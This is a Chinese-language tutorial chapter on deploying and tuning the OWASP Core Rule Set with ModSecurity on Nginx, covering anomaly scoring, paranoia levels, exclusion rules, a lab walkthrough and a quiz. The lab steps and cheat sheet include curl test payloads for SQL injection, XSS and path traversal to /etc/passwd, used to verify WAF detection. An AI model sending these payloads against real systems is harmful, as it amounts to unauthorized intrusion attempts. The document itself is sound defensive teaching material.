| 特定應用的排除包 | 例如 WordPress、Nextcloud、DokuWiki 等常見軟體的已知誤判 |
| 額外偵測 | 補上 CRS 本體沒有的特定攻擊偵測 |
| 自家應用的排除包 | ★★★ 把你自己寫的排除規則整理成 plugin，方便跨環境重複使用 |

> [!tip] ★★★ MyGuard 提供的 CRS 外掛
> myguard-labs 除了強化版 NGINX，也維護一組 OWASP CRS 外掛
> （WordPress 強化、Vaultwarden 等應用的排除包）。
> 若你已經走 MyGuard 路線，可以直接取用，省下自己摸索該應用誤判的時間。
> 見 [[060-02-05-01-guide-MyGuard-MyGuard套件庫介紹]]
> 與 [[060-02-05-08-guide-MyGuard-MyGuard實戰組合]]。
>
> **注意**：本手冊不納入郵件伺服器相關主題，myguard-labs 的郵件類外掛不在範圍內。

> [!warning] ★★★ 外掛不是萬靈丹
> 官方外掛處理的是「這個軟體的**標準安裝**會有的誤判」。
> 你們機關裝了三個客製模組的那套 CMS，還是得自己調。

> [!info]- Apache 對照：掛上 CRS
> Apache 的載入順序邏輯完全一樣，只是換成 `IncludeOptional`：
>
> ```apache
> # /etc/apache2/mods-enabled/security2.conf
> <IfModule security2_module>
>     SecDataDir /var/cache/modsecurity
>
>     IncludeOptional /etc/modsecurity/*.conf
>     IncludeOptional /etc/modsecurity/crs-setup.conf
>     IncludeOptional /etc/modsecurity/crs-exclusions-before.conf
>     IncludeOptional /usr/share/modsecurity-crs/rules/*.conf
>     IncludeOptional /etc/modsecurity/crs-exclusions-after.conf
> </IfModule>
> ```
>
> ```bash
> sudo apachectl configtest
> # 預期輸出：
> # Syntax OK
> sudo systemctl reload apache2
> ```
>
> ★★★★ 順序踩雷的方式與 Nginx 完全相同：`-before` 一定在 CRS 之前，
> `-after` 一定在 CRS 之後。另外 Apache 的 `.htaccess` 不能放 ModSecurity 指令，
> 想針對目錄調整要用 `<Directory>` 或 `<Location>` 區塊 ——
> 見 [[060-02-03-04-guide-Apache-htaccess與Rewrite]]。

---

## 完整實戰範例

**目標**：在上一篇建好的 `waf-lab` 上裝 CRS，設定 PL1 + DetectionOnly，
發三個不同「攻擊強度」的請求，**在日誌中親眼看到分數怎麼累加、什麼時候會過門檻**。

### 步驟 1：確認起點

```bash
grep '^SecRuleEngine' /etc/nginx/modsec/modsecurity.conf
```

```text
SecRuleEngine DetectionOnly
```

```bash
grep -n 'SecAuditLogParts' /etc/nginx/modsec/modsecurity.conf
```

```text
223:SecAuditLogParts ABIJDEFHZ
```

★★★★★ 這兩項不對就不要往下走。`H` 段沒有的話你看不到分數。

移除上一篇的冒煙測試規則（避免干擾）：

```bash
sudo sed -i '/10-smoke-test.conf/d' /etc/nginx/modsec/main.conf
```

### 步驟 2：取得 CRS

```bash
cd /etc/nginx/modsec
sudo git clone --depth 1 -b v4/master \
  https://github.com/coreruleset/coreruleset.git crs
sudo cp /etc/nginx/modsec/crs/crs-setup.conf.example \
        /etc/nginx/modsec/crs-setup.conf
ls /etc/nginx/modsec/crs/rules/ | head -8
```

```text
REQUEST-901-INITIALIZATION.conf
REQUEST-905-COMMON-EXCEPTIONS.conf
REQUEST-911-METHOD-ENFORCEMENT.conf
REQUEST-913-SCANNER-DETECTION.conf
REQUEST-920-PROTOCOL-ENFORCEMENT.conf
REQUEST-921-PROTOCOL-ATTACK.conf
REQUEST-922-MULTIPART-ATTACK.conf
REQUEST-930-APPLICATION-ATTACK-LFI.conf
```

```bash
ls /etc/nginx/modsec/crs/rules/*.conf | wc -l
```

```text
25
```

### 步驟 3：設定 PL1 與門檻

在 `crs-setup.conf` 裡找到 Paranoia Level 那個 `SecAction` 區塊，
把註解拿掉並確認值：

```bash
sudo grep -n 'paranoia_level' /etc/nginx/modsec/crs-setup.conf | head
```

```text
 78:#  setvar:tx.blocking_paranoia_level=1"
 96:#  setvar:tx.detection_paranoia_level=1"
```

★★★★ 註解掉時 CRS 內部有預設值（通常就是 PL1），
但**明確寫出來**比較好，將來別人接手看得懂。手動編輯：

```bash
sudo nano /etc/nginx/modsec/crs-setup.conf
```

把 PL 與門檻兩個區塊的註解拿掉，確認成：

```apache
SecAction \
 "id:900000,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:tx.blocking_paranoia_level=1"

SecAction \
 "id:900110,\
  phase:1,\
  nolog,\
  pass,\
  t:none,\
  setvar:tx.inbound_anomaly_score_threshold=5,\
  setvar:tx.outbound_anomaly_score_threshold=4"
```

> [!warning] ★★★★ 這裡的 ID 以你手上的檔案為準
> 上面寫的 `900000` / `900110` 是照著範本檔既有的區塊，
> **不要自己編一個 ID**，直接用檔案裡原本就有的那個。

### 步驟 4：更新 `main.conf`

```bash
sudo tee /etc/nginx/modsec/main.conf > /dev/null <<'EOF'
Include /etc/nginx/modsec/modsecurity.conf
Include /etc/nginx/modsec/crs-setup.conf
Include /etc/nginx/modsec/crs-exclusions-before.conf
Include /etc/nginx/modsec/crs/rules/*.conf
Include /etc/nginx/modsec/crs-exclusions-after.conf
EOF

sudo nginx -t
```

```text
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
```

```bash
sudo systemctl reload nginx
```

> [!warning] ★★★ 如果 `nginx -t` 這裡失敗
> 常見原因：
> 1. `crs-exclusions-before.conf` 或 `-after.conf` 不存在 → 先建空檔
> 2. `REQUEST-901-INITIALIZATION.conf` 沒被載入（萬用字元路徑寫錯）→ 大量 `Unknown variable tx....` 錯誤
> 3. CRS 版本要求的 ModSecurity 版本比你裝的新

### 步驟 5：正常請求 —— 回歸驗證 ★★★★

```bash
sudo truncate -s 0 /var/log/nginx/modsec_audit.log
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.56.20/
curl -s -o /dev/null -w '%{http_code}\n' \
  --get --data-urlencode "q=公文查詢系統" http://192.168.56.20/
```

```text
200
200
```

```bash
sudo wc -l /var/log/nginx/modsec_audit.log
```

```text
0 /var/log/nginx/modsec_audit.log
```

★★★★ 正常請求不該產生任何稽核紀錄。若這裡就一堆紀錄，代表有低分規則在誤判，
先記下來（那就是你的第一批誤判清單）。

### 步驟 6：低分請求 —— 觀察「命中但不擋」★★★★★

發一個只會命中低嚴重度規則的請求（不標準的 User-Agent）：

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -A "" -H "Accept:" http://192.168.56.20/
```

```text
200
```

```bash
sudo grep -E 'Anomaly Score|anomaly_score' /var/log/nginx/modsec_audit.log | tail -3
```

可能會看到類似：

```text
ModSecurity: Warning. Matched "Operator `Eq' with parameter `0' against variable
`TX:INBOUND_ANOMALY_SCORE' ... [msg "Inbound Anomaly Score Exceeded (Total Score: 3)"]
```

> [!note] ★★★★★ 這裡就是關鍵觀察點
> **總分 3 < 門檻 5 → 請求放行（HTTP 200）**，但稽核日誌有紀錄。
> 這正是「日誌有 Warning 不等於使用者被擋」的實例。

### 步驟 7：高分請求 —— 觀察分數過門檻 ★★★★★

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  --get --data-urlencode "id=1' OR '1'='1" \
  http://192.168.56.20/
```

```text
200
```

（★★★★ 仍是 200，因為 `DetectionOnly`。）

```bash
sudo grep -E '\[id "9' /var/log/nginx/modsec_audit.log | tail -6
```

```text
ModSecurity: Warning. detected SQLi using libinjection. [file
"/etc/nginx/modsec/crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"]
[line "..."] [id "942xxx"] [msg "SQL Injection Attack Detected via libinjection"]
[data "Matched Data: 1' OR '1'='1 found within ARGS:id: 1' OR '1'='1"]
[severity "CRITICAL"] [tag "attack-sqli"] ...

ModSecurity: Warning. Operator GE matched 5 at TX:inbound_anomaly_score.
[file "/etc/nginx/modsec/crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"]
[line "..."] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 15)"]
[severity "CRITICAL"] ...
```

> [!warning] 未實機驗證
> 上面的規則 ID 與訊息文字**依 CRS 版本而異**，
> `942xxx` 是刻意寫成佔位，實際請看你自己日誌裡的數字。
> 觀察重點不是 ID，是**兩種訊息的差別**。

★★★★★ **看懂這兩行的差別是本篇的核心**：

| 訊息類型 | 意義 | 來自 |
| --- | --- | --- |
| `SQL Injection Attack Detected...` | **偵測規則**：發現特徵，加分 | `REQUEST-942-...conf` |
| `Inbound Anomaly Score Exceeded (Total Score: 15)` | ★★★★★ **評估規則**：總分過門檻，這裡才決定擋不擋 | `REQUEST-949-BLOCKING-EVALUATION.conf` |

**做誤判分析時，第一行告訴你「哪條規則、命中哪個欄位」，
第二行告訴你「這個請求會不會被擋」。兩行都要看。**

### 步驟 8：統計這次測試命中了哪些規則 ★★★★

```bash
sudo grep -oP '\[id "\K[0-9]+' /var/log/nginx/modsec_audit.log \
  | sort | uniq -c | sort -rn
```

```text
      3 942xxx
      1 949110
      1 980130
      1 920xxx
```

★★★★ 這條指令是**誤判分析的主力工具**，03 篇會大量使用。

### 步驟 9：驗證「切到 On 會擋」（只在實驗機）

> [!danger] ★★★★★ 正式環境不可以做這一步
> 沒有經過至少兩週 `DetectionOnly` 觀察與誤判排除，
> 直接切 `On` 就是本章一再警告的失敗劇本。

```bash
sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' \
     /etc/nginx/modsec/modsecurity.conf
sudo nginx -t && sudo systemctl reload nginx

# 攻擊請求
curl -s -o /dev/null -w '攻擊: %{http_code}\n' \
  --get --data-urlencode "id=1' OR '1'='1" http://192.168.56.20/
# 正常請求
curl -s -o /dev/null -w '正常: %{http_code}\n' http://192.168.56.20/
# 低分請求
curl -s -o /dev/null -w '低分: %{http_code}\n' -A "" http://192.168.56.20/
```

```text
攻擊: 403
正常: 200
低分: 200
```

★★★★★ 三個結果各自證明一件事：
擋得住攻擊、不擋正常流量、**低分請求不會被擋**（評分機制生效）。

### 步驟 10：改回 `DetectionOnly` ★★★★★

```bash
sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine DetectionOnly/' \
     /etc/nginx/modsec/modsecurity.conf
sudo nginx -t && sudo systemctl reload nginx
grep '^SecRuleEngine' /etc/nginx/modsec/modsecurity.conf
```

```text
SecRuleEngine DetectionOnly
```

### 步驟 11：門檻實驗（理解用，不要當調校手段）★★★

把入站門檻臨時改成 20，重發那個 SQLi 請求：

```bash
sudo sed -i 's/tx.inbound_anomaly_score_threshold=5/tx.inbound_anomaly_score_threshold=20/' \
     /etc/nginx/modsec/crs-setup.conf
sudo nginx -t && sudo systemctl reload nginx
sudo truncate -s 0 /var/log/nginx/modsec_audit.log

curl -s -o /dev/null --get --data-urlencode "id=1' OR '1'='1" \
  http://192.168.56.20/
sudo grep -c 'Anomaly Score Exceeded' /var/log/nginx/modsec_audit.log
```

```text
0
```

★★★★ 總分 15 < 門檻 20 → 評估規則不觸發。
**這證明了為什麼「調高門檻」是危險的止痛藥**：它讓真正的攻擊也不會被擋。

改回來：

```bash
sudo sed -i 's/tx.inbound_anomaly_score_threshold=20/tx.inbound_anomaly_score_threshold=5/' \
     /etc/nginx/modsec/crs-setup.conf
sudo nginx -t && sudo systemctl reload nginx
```

### 步驟 12：交付檢查表

| # | 檢查項 | 通過標準 |
| --- | --- | --- |
| 1 | `nginx -t` | successful |
| 2 | `nginx -T \| grep -c 'SecRule '` | 數百到數千條 ★★★ |
| 3 | `SecRuleEngine` | `DetectionOnly` ★★★★★ |
| 4 | PL | 1 ★★★★★ |
| 5 | 入站門檻 | 5（未被調高）★★★★ |
| 6 | 允許方法含應用實際用到的 | 例如 API 需要 `PUT`/`DELETE` ★★★★ |
| 7 | 允許 Content-Type 含 `application/json` | API 站台必查 ★★★★ |
| 8 | `-before` / `-after` 兩個排除檔存在且順序正確 | ★★★★★ |
| 9 | 正常首頁請求無稽核紀錄 | ★★★ |
| 10 | SQLi 測試請求有 `Anomaly Score Exceeded` 訊息 | ★★★★ |
| 11 | logrotate 已設定 | ★★★ |
| 12 | 觀察期起始日期已記錄 | ★★★★ 兩週後才能談切 `On` |

---

## 常見錯誤與排錯

| # | 現象 | 原因 | 解法 |
| --- | --- | --- | --- |
| 1 | `nginx -t` 出現大量 `Unknown variable: TX:...` | `REQUEST-901-INITIALIZATION.conf` 沒載入 | 檢查 `Include .../rules/*.conf` 路徑；901 必須先於其他規則 ★★★★ |
| 2 | 載入 CRS 後 `nginx -t` 報某條規則語法錯 | CRS 版本要求的 ModSecurity 比你裝的新 | 換 CRS 分支（如 `v3/master`），或升級 libmodsecurity ★★★ |
| 3 | 排除規則寫了完全沒效果，也不報錯 | ★★★★★ 放在錯誤的 Include 位置 | `ctl:` 系列放 `-before`；`SecRuleRemoveById`/`UpdateTargetById` 放 `-after` |
| 4 | 整個 REST API 全部 403 | 允許方法清單沒有 `PUT`/`PATCH`/`DELETE` | 在 `crs-setup.conf` 的 `tx.allowed_methods` 補上 ★★★★ |
| 5 | 所有 JSON 請求被擋 | 允許 Content-Type 沒有 `application/json` | 補進 `tx.allowed_request_content_type` ★★★★ |
| 6 | 後台儲存文章 403 | ★★★★★ 富文字編輯器的 HTML 被判成 XSS | 針對該 URI + 該參數用 `ctl:ruleRemoveTargetById` 排除，見 03 篇 |
| 7 | 姓名含 `'`（如 `O'Brien`）被擋 | SQLi 規則命中撇號 | 針對該表單 URI 的姓名參數排除 ★★★★ |
| 8 | 上傳檔案 403 | multipart 規則或副檔名限制 | 檢查 `tx.restricted_extensions`；針對上傳 URI 做排除 ★★★ |
| 9 | 日誌全是 Warning，以為使用者一直被擋 | ★★★★★ 混淆「命中」與「阻擋」 | 只看 `Anomaly Score Exceeded` 那行；`DetectionOnly` 下沒人被擋 |
| 10 | 命中一堆規則但完全沒有評分訊息 | 用了傳統模式，或 949 檔沒載入 | 確認 `REQUEST-949-BLOCKING-EVALUATION.conf` 在載入清單裡 ★★★★ |
| 11 | 回應內容被截斷、頁面顯示不完整 | 出站規則誤判，或 `SecResponseBodyLimit` 太小 | 檢查 95xxxx 命中；調整 limit 或針對該路徑關閉出站檢查 ★★★★ |
| 12 | 調高 PL 之後誤判暴增到無法使用 | ★★★★★ PL2 以上不適合未經長期調校的環境 | 立刻降回 PL1；改用 `detection_paranoia_level` 評估 |
| 13 | 內部監控腳本被協定規則擋掉 | 腳本的 HTTP 實作不標準（缺 Host、缺 Accept） | 修腳本；或針對監控來源 IP 做例外 ★★★ |
| 14 | 排定的弱點掃描全被 913 擋掉 | 掃描器 User-Agent 被辨識 | 掃描期間針對掃描來源 IP 例外處理 ★★★ |
| 15 | 效能明顯下降、回應變慢 | 規則數量大 + 出站檢查全開 | 靜態資源 `modsecurity off;`；評估關閉出站檢查，見 05 篇 ★★★ |
| 16 | `git pull` 升級 CRS 後設定全部跑掉 | `crs-setup.conf` 放在 `crs/` 目錄裡被覆蓋 | 把它移到 `crs/` 外面 ★★★★ |
| 17 | 稽核日誌一天長到數 GB | `SecAuditEngine On`，或誤判量太大 | 改 `RelevantOnly`；先處理誤判 ★★★★ |
| 18 | 同一個誤判排除了還是發生 | 抄了別人文章的規則 ID，跟你的版本對不上 | ★★★★★ **從自己的日誌抄 ID**，不要抄文章 |

---

## 安全性注意事項

> [!danger] ★★★★★ 四條紅線
> 1. **不要用調高門檻或降低嚴重度分數來「解決」誤判** —— 那是全面削弱防護。
> 2. **不要用 `SecRuleRemoveByTag` 關掉整類規則**。
> 3. **不要在正式環境從 PL1 直接跳到 PL3**。
> 4. **不要抄別人的規則 ID**，一定要從自己的稽核日誌抄。

### 其他要點

| 項目 | 說明 | 重要度 |
| --- | --- | --- |
| CRS 版本更新排入維運行事曆 | 新攻擊手法需要新規則 | ★★★★ |
| 升級 CRS 後要重跑觀察期 | 新規則可能帶來新誤判 | ★★★★ |
| 排除規則要有註解 | 寫清楚：為什麼排除、誰核可、日期 | ★★★★★ |
| 排除規則納入版控 | 才有辦法追溯與回退 | ★★★★ |
| 定期回顧排除清單 | 應用改版後，舊的排除可能已無必要卻仍在放行 | ★★★★ |
| `tx.sampling_percentage` 記得調回 100 | 導入期的抽樣不要忘了關 | ★★★★ |
| 出站規則的誤判要主動測 | 使用者不會來告訴你「頁面少一半」 | ★★★★ |
| 掃描器例外要有時效 | 不要永久放行掃描來源 IP | ★★★ |
| WAF 不是唯一防線 | 見 [[090-05-01-guide-資安設備-資安全景圖與縱深防禦]] | ★★★★ |

> [!warning] ★★★★★ 排除規則的註解格式建議
> ```apache
> # ---------------------------------------------------------------
> # 排除原因：後台文章編輯器儲存 HTML 內容，被 XSS 規則誤判
> # 影響 URI ：/admin/article/save
> # 影響參數 ：ARGS:content
> # 規則 ID  ：（從 2026-09-01 稽核日誌統計得出）
> # 申請人   ：資訊室 王小明
> # 核可     ：資安承辦 2026-09-02
> # 複核日期 ：2027-03-01（應用改版後需重新評估）
> # ---------------------------------------------------------------
> ```
> 沒有註解的排除規則，兩年後沒人敢動，也沒人知道還需不需要 ——
> 那就變成一個永久的防護缺口。

---

## 速查表

### 引擎 vs 規則集

| | ModSecurity | OWASP CRS |
| --- | --- | --- |
| 角色 | 引擎 | 規則 |
| 類比 | 掃描引擎 | 病毒碼 |
| 提供 | `SecRule` 語法、HTTP 解析、阻擋機制 | 上千條攻擊特徵規則 |

### 異常評分

| 項目 | 值 |
| --- | --- |
| CRITICAL | 5 分 |
| ERROR | 4 分 |
| WARNING | 3 分 |
| NOTICE | 2 分 |
| 入站門檻預設 | 5（`tx.inbound_anomaly_score_threshold`）★★★★★ |
| 出站門檻預設 | 4（`tx.outbound_anomaly_score_threshold`） |
| 判定發生在 | `REQUEST-949-BLOCKING-EVALUATION.conf` / `RESPONSE-959-...` ★★★★★ |

### Paranoia Level

| PL | 誤判 | 建議 |
| --- | --- | --- |
| PL1 | 少 | ★★★★★ 一律從這裡開始 |
| PL2 | 明顯上升 | 調校成熟後才考慮 |
| PL3 | 高 | 需專人長期維護 |
| PL4 | 極高 | 幾乎不用在一般網站 |

### 規則 ID 號段

| 號段 | 類別 |
| --- | --- |
| 901 | 初始化（必載）|
| 911 | HTTP 方法 |
| 913 | 掃描器偵測 |
| 920 / 921 | 協定強制 / 協定攻擊 |
| 930 / 931 / 932 / 933 | LFI / RFI / RCE / PHP |
| 941 / 942 / 943 | XSS / SQLi / Session Fixation |
| **949** | ★★★★★ 入站評分判定 |
| 95x | 出站資料外洩 |
| **959** | ★★★★★ 出站評分判定 |
| 980 | 關聯與總結 |

### 三種排除寫法

| 寫法 | 範圍 | 放哪 |
| --- | --- | --- |
| `SecRuleRemoveById <id>` | 全站全參數 | `-after` |
| `SecRuleRemoveByTag "<tag>"` | ★★★★★ 整類，幾乎不該用 | `-after` |
| `SecRuleUpdateTargetById <id> "!ARGS:x"` | 全站單一參數 | `-after` |
| `ctl:ruleRemoveTargetById=<id>;ARGS:x` | ★★★★★ 單一 URI 單一參數 | `-before` |
| `ctl:ruleEngine=Off` | 整個請求，最後手段 | `-before` |

### 重要路徑

| 路徑 | 用途 |
| --- | --- |
| `/etc/nginx/modsec/crs-setup.conf` | PL、門檻、允許清單 |
| `/etc/nginx/modsec/crs/rules/` | CRS 規則本體（不要改） |
| `/etc/nginx/modsec/crs-exclusions-before.conf` | ★★★★ `ctl:` 類排除 |
| `/etc/nginx/modsec/crs-exclusions-after.conf` | ★★★★ `SecRuleRemove*` 類排除 |
| `/etc/nginx/modsec/crs/plugins/` | CRS 外掛 |

### 常用指令

| 指令 | 用途 |
| --- | --- |
| `ls /etc/nginx/modsec/crs/rules/*.conf \| wc -l` | 有幾個規則檔 |
| `nginx -T \| grep -c 'SecRule '` | 實際載入幾條規則 |
| `grep -oP '\[id "\K[0-9]+' modsec_audit.log \| sort \| uniq -c \| sort -rn` | ★★★★★ 統計最常命中的規則 |
| `grep 'Anomaly Score Exceeded' modsec_audit.log` | ★★★★★ 只看真的會被擋的請求 |
| `grep -oP 'Total Score: \K[0-9]+' modsec_audit.log \| sort -n \| uniq -c` | 分數分布 |
| `curl --get --data-urlencode "id=1' OR '1'='1" <url>` | SQLi 測試 |
| `curl --get --data-urlencode "q=<script>alert(1)</script>" <url>` | XSS 測試 |
| `curl "<url>/?file=../../../../etc/passwd"` | LFI 測試 |

---

## 練習題

> [!example] 練習 1（★★★）
> 裝好 CRS 後，用一條指令統計 `crs/rules/` 底下每個規則檔各有幾條 `SecRule`，
> 由多到少排序。說明哪一類規則最多，為什麼。

> [!question]- 參考解答
> ```bash
> for f in /etc/nginx/modsec/crs/rules/*.conf; do
>   printf '%5d  %s\n' "$(grep -c '^SecRule' "$f")" "$(basename "$f")"
> done | sort -rn | head
> ```
> 通常 SQLi（942）與 XSS（941）的規則數最多。
> 原因是這兩類攻擊的變形手法最多（各種編碼、註解、大小寫混雜、函式替換），
> 需要大量規則才能覆蓋。★★★ 這也解釋了為什麼它們的誤判也最多。

> [!example] 練習 2（★★★★★）
> 發一個只會命中 NOTICE 級規則的請求（總分 2），與一個命中 CRITICAL 的請求（總分 ≥5），
> 從稽核日誌證明前者沒有觸發評估規則、後者有。

> [!question]- 參考解答
> ```bash
> sudo truncate -s 0 /var/log/nginx/modsec_audit.log
> curl -s -o /dev/null -A "" http://192.168.56.20/            # 低分
> sudo grep -c 'Anomaly Score Exceeded' /var/log/nginx/modsec_audit.log
> # 預期：0
>
> sudo truncate -s 0 /var/log/nginx/modsec_audit.log
> curl -s -o /dev/null --get --data-urlencode "id=1' OR '1'='1" \
>   http://192.168.56.20/                                     # 高分
> sudo grep -c 'Anomaly Score Exceeded' /var/log/nginx/modsec_audit.log
> # 預期：1
> ```
> ★★★★★ 這個對照實驗是理解評分機制最直接的方式。

> [!example] 練習 3（★★★★）
> 假設你的後台 `/admin/post/save` 的 `body` 參數會被 XSS 規則誤判。
> 用**三種寫法**各寫一次排除規則，並比較三者的影響範圍。

> [!question]- 參考解答
> ```apache
> # 寫法一（-after）：全站關掉這條規則 —— 影響最大
> SecRuleRemoveById <從日誌抄來的ID>
>
> # 寫法二（-after）：全站的 body 參數不再被這條規則檢查
> SecRuleUpdateTargetById <ID> "!ARGS:body"
>
> # 寫法三（-before）：★★★★★ 只有這個 URI 的這個參數
> SecRule REQUEST_URI "@beginsWith /admin/post/save" \
>     "id:1100010,phase:2,pass,nolog,\
>      ctl:ruleRemoveTargetById=<ID>;ARGS:body"
> ```
> 影響範圍：寫法一 = 全站全參數；寫法二 = 全站的 `body`；
> 寫法三 = 只有 `/admin/post/save` 的 `body`。
> **正式環境選寫法三。**

> [!example] 練習 4（★★★★）
> 用 `tx.detection_paranoia_level=2` 搭配 `tx.blocking_paranoia_level=1`
> 跑一天，統計 PL2 規則會額外命中多少次、命中哪些 URI，
> 寫成一份「是否升級到 PL2」的評估。

> [!question]- 參考解答
> 設定後跑一天，然後：
> ```bash
> sudo grep -oP '\[id "\K[0-9]+' /var/log/nginx/modsec_audit.log \
>   | sort | uniq -c | sort -rn > /tmp/pl2-eval.txt
> sudo grep -oP '\[uri "\K[^"]+' /var/log/nginx/modsec_audit.log \
>   | sort | uniq -c | sort -rn | head -20
> ```
> 評估重點：新增的命中集中在哪些 URI？是攻擊還是正常業務流量？
> 若新增的幾乎都是正常業務 → **不要升 PL2**。★★★★

> [!example] 練習 5（★★★）
> 檢查你的 `crs-setup.conf` 裡的 `tx.allowed_methods` 與
> `tx.allowed_request_content_type`，對照你實際應用會用到的方法與 Content-Type，
> 列出需要補上的項目。

> [!question]- 參考解答
> ```bash
> grep -n 'allowed_methods\|allowed_request_content_type' \
>      /etc/nginx/modsec/crs-setup.conf
> # 對照應用的 API 文件或路由定義
> ```
> 常見需要補的：`PUT`、`PATCH`、`DELETE`、`OPTIONS`（CORS 預檢）、
> `application/json`、`multipart/form-data`。★★★★
> **這一步沒做，API 站台切 `On` 的當下就全站掛掉。**

> [!example] 練習 6（★★★★）
> 把 `SecAuditLogParts` 暫時改成不含 `H`，重發 SQLi 測試請求，
> 說明你失去了哪些調校所需的資訊。

> [!question]- 參考解答
> 失去的是：規則 ID、`msg`、`data`（命中的實際內容）、severity、
> **以及最關鍵的異常分數總結訊息**。
> 剩下的只有請求本身，你完全無法判斷「命中了什麼、加了幾分、會不會被擋」。
> ★★★★★ 結論：`H` 段是 CRS 調校的唯一資訊來源，永遠保留。

---

## 小測驗

**Q1.** ModSecurity 與 OWASP CRS 的關係最接近下列哪個比喻？
（A）作業系統與應用程式 （B）防毒掃描引擎與病毒碼
（C）資料庫與資料表 （D）防火牆與路由器

**Q2.**（是非）稽核日誌裡出現 `ModSecurity: Warning. Matched ...`，
代表這個請求已經被阻擋了。

**Q3.** CRS 預設的入站異常分數門檻是多少？一條 CRITICAL 規則加幾分？
這代表什麼實務意義？

**Q4.** 這兩行日誌訊息的差別是什麼？
`SQL Injection Attack Detected` 與 `Inbound Anomaly Score Exceeded (Total Score: 15)`

**Q5.** 一個機關的網站要導入 CRS，稽核委員建議「直接設 PL3 比較安全」。
請說明你會怎麼回應。

**Q6.** 下面三種排除寫法，由影響範圍**大到小**排序：
（A）`SecRuleUpdateTargetById 942xxx "!ARGS:content"`
（B）`ctl:ruleRemoveTargetById=942xxx;ARGS:content`（限定 URI）
（C）`SecRuleRemoveByTag "attack-sqli"`

**Q7.** 這條排除規則放在 `crs-exclusions-after.conf`，會發生什麼事？

```apache
SecRule REQUEST_URI "@beginsWith /admin/save" \
    "id:1100001,phase:2,pass,nolog,\
     ctl:ruleRemoveTargetById=942100;ARGS:content"
```

**Q8.** 為什麼「把 `tx.critical_anomaly_score` 從 5 改成 1」是錯誤的誤判解法？

**Q9.** 一個 REST API 站台裝上 CRS 後，所有 `PUT` 與 `DELETE` 請求都被擋。
最可能的原因與解法是什麼？

**Q10.** 為什麼本篇一直強調「不要抄別人文章裡的 CRS 規則 ID」？

> [!question]- 測驗答案
> **A1. (B)**
> ModSecurity 是**引擎**（提供解析與比對能力，但不知道什麼是攻擊），
> CRS 是**規則**（描述攻擊特徵，需要引擎才能執行）。
> 兩者缺一不可。★★★★ 參見〈觀念說明〉開頭。
>
> **A2. 錯。**
> 這只是**偵測規則命中並加分**。是否阻擋取決於：
> (1) 總分有沒有超過門檻（看 `Anomaly Score Exceeded` 訊息）
> (2) `SecRuleEngine` 是不是 `On`
> 在 `DetectionOnly` 下永遠不會擋。★★★★★ 這是本篇最重要的觀念。
>
> **A3.** 門檻預設 **5**，一條 CRITICAL 加 **5** 分。
> 實務意義是：**只要命中任何一條 CRITICAL 規則就足以觸發阻擋**，
> 預設設定其實相當嚴格。評分機制的價值不在「寬鬆」，
> 而在提供一個可量化調整的旋鈕。★★★★
>
> **A4.** 前者是**偵測規則**（942 檔），告訴你「發現什麼特徵、命中哪個欄位」；
> 後者是**評估規則**（949 檔），告訴你「總分多少、會不會被擋」。
> 誤判分析時**兩行都要看**：前者定位問題參數，後者判斷嚴重程度。★★★★★
>
> **A5.** 要點：
> 1. PL1 已涵蓋 OWASP Top 10 的大部分實際攻擊
> 2. PL3 的誤判量會讓系統無法正常使用，最終結果通常是 WAF 被整個關掉 —— 那時安全性是零
> 3. 建議做法：PL1 上線並認真調校，同時用 `tx.detection_paranoia_level=2`
>    「只偵測不阻擋」蒐集資料，兩週後拿數據討論是否升級
>
> **「PL1 + 認真調校」的實際防護力遠高於「PL3 + 被關掉」。** ★★★★★
>
> **A6. C > A > B**
> - C：整類 SQLi 規則全部關掉（★★★★★ 幾乎永遠是錯的）
> - A：全站的 `content` 參數不再被該規則檢查
> - B：只有指定 URI 的 `content` 參數 —— 精準度最高，**正式環境選這個**
>
> **A7. 完全沒有效果，而且不會報錯。**
> `ctl:` 是**執行期**動作，必須在目標規則執行**之前**跑到。
> 放在 `-after`（CRS 規則之後）時，942 規則早就跑完了。
> **必須移到 `crs-exclusions-before.conf`。** ★★★★★
> 參見「掛上 CRS：修改 `main.conf`」的 danger 區塊。
>
> **A8.** 因為它會**同時削弱所有 CRITICAL 規則**，包含真正在防 SQLi、XSS、RCE 的規則。
> 這等於「警報太吵就把警報器音量調到最小」——
> 誤判是不見了，真攻擊也不會被擋了。
> 正確做法是針對誤判的 URI + 參數 + 規則 ID 做精準排除。★★★★
>
> **A9.** 最可能是 `crs-setup.conf` 的 `tx.allowed_methods` 沒有包含
> `PUT`／`DELETE`（CRS 的方法限制規則預設只允許常見的幾種）。
> 解法是把應用實際使用的所有方法補進允許清單。
> 同時要檢查 `tx.allowed_request_content_type` 有沒有 `application/json`。
> ★★★★ 這是 API 站台導入 CRS 最先炸掉的地方。
>
> **A10.** 因為 **CRS 的規則 ID 會隨版本增刪**。抄一個跟你的版本對不上的 ID，
> 結果是「排除了一條不存在的規則」—— 排除規則寫了但誤判照樣發生，
> 而你會以為已經處理完了，直到使用者再次客訴。
> **正確做法永遠是從自己的稽核日誌抄 ID。** ★★★★★

---

## 延伸閱讀

### 本章其他篇

- [[090-04-01-svc-WAF-WAF概念與ModSecurity安裝]] —— 引擎安裝與 `DetectionOnly` 上線
- [[090-04-03-svc-ModSecurity-規則調校與誤判處理]] —— ★★★★★ **本篇的機制在這裡變成流程**
- [[090-04-04-guide-ModSecurity-日誌分析與監控]] —— 稽核日誌深入判讀
- [[090-04-05-guide-ModSecurity-效能與實戰情境]] —— 規則數量與效能的取捨
- [[090-04-00-idx-ModSecurity]] —— 本章索引

### 相關主題

- [[090-05-04-guide-資安設備-Web應用防火牆WAF]] —— WAF 設備選型與市場全景
- [[090-05-01-guide-資安設備-資安全景圖與縱深防禦]] —— CRS 在整體防禦的位置
- [[090-03-02-guide-應用安全-應用層安全]] —— 每一類 CRS 規則對應的攻擊原理
- [[090-03-06-guide-應用安全-委外系統上線前資安檢測]] —— 掃描與 WAF 的互動
- [[090-02-08-guide-防護-系統強化與稽核]]

### Web 伺服器

- [[060-02-02-09-guide-Nginx-安全設定]]
